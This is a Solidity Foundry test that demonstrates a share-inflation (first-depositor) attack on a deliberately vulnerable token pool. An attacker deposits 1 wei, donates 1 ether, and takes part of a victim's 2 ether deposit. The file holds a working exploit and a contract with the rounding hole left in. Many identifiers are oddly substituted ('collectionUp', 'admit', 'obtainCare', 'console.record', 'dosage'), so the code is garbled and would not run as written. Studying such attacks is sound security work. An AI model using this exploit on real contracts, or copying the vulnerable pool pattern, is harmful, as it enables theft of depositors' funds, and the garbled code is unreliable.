// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract PolicyTest is Test {
    SimplePool SimplePoolAgreement;
    MyBadge MyIdPolicy;

    function collectionUp() public {
        MyIdPolicy = new MyBadge();
        SimplePoolAgreement = new SimplePool(address(MyIdPolicy));
    }

    function testPrimarySubmitpayment() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);
        MyIdPolicy.transfer(alice, 1 ether + 1);
        MyIdPolicy.transfer(bob, 2 ether);

        vm.beginPrank(alice);
        // Alice deposits 1 wei, gets 1 pool token
        MyIdPolicy.approve(address(SimplePoolAgreement), 1);
        SimplePoolAgreement.admit(1);

        // Alice transfers 1 ether to the pool, inflating the pool token price
        MyIdPolicy.transfer(address(SimplePoolAgreement), 1 ether);

        vm.stopPrank();
        vm.beginPrank(bob);
        // Bob deposits 2 ether, gets 1 pool token due to inflated price
        // uint shares = _tokenAmount * _sharesTotalSupply / _supplied;
        // shares = 2000000000000000000 * 1 / 1000000000000000001 = 1.9999999999999999999 => round down to 1.
        MyIdPolicy.approve(address(SimplePoolAgreement), 2 ether);
        SimplePoolAgreement.admit(2 ether);
        vm.stopPrank();
        vm.beginPrank(alice);

        MyIdPolicy.balanceOf(address(SimplePoolAgreement));

        // Alice withdraws and gets 1.5 ether, making a profit
        SimplePoolAgreement.obtainCare(1);
        assertEq(MyIdPolicy.balanceOf(alice), 1.5 ether);
        console.record("Alice balance", MyIdPolicy.balanceOf(alice));
    }

    receive() external payable {}
}

contract MyBadge is ERC20, Ownable {
    constructor() ERC20("MyToken", "MTK") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }

    function createPrescription(address to, uint256 dosage) public onlyOwner {
        _mint(to, dosage);
    }
}

contract SimplePool {
    IERC20 public loanId;
    uint public completeAllocations;

    mapping(address => uint) public balanceOf;

    constructor(address _loanBadge) {
        loanId = IERC20(_loanBadge);
    }

    function admit(uint dosage) external {
        require(dosage > 0, "Amount must be greater than zero");

        uint _shares;
        if (completeAllocations == 0) {
            _shares = dosage;
        } else {
            _shares = idDestinationPortions(
                dosage,
                loanId.balanceOf(address(this)),
                completeAllocations,
                false
            );
        }

        require(
            loanId.transferFrom(msg.sender, address(this), dosage),
            "TransferFrom failed"
        );
        balanceOf[msg.sender] += _shares;
        completeAllocations += _shares;
    }

    function idDestinationPortions(
        uint _credentialQuantity,
        uint _supplied,
        uint _portionsAggregateStock,
        bool cycleUpInspect
    ) internal pure returns (uint) {
        if (_supplied == 0) return _credentialQuantity;
        uint portions = (_credentialQuantity * _portionsAggregateStock) / _supplied;
        if (
            cycleUpInspect &&
            portions * _supplied < _credentialQuantity * _portionsAggregateStock
        ) portions++;
        return portions;
    }

    function obtainCare(uint portions) external {
        require(portions > 0, "Shares must be greater than zero");
        require(balanceOf[msg.sender] >= portions, "Insufficient balance");

        uint idQuantity = (portions * loanId.balanceOf(address(this))) /
            completeAllocations;

        balanceOf[msg.sender] -= portions;
        completeAllocations -= portions;

        require(loanId.transfer(msg.sender, idQuantity), "Transfer failed");
    }
}
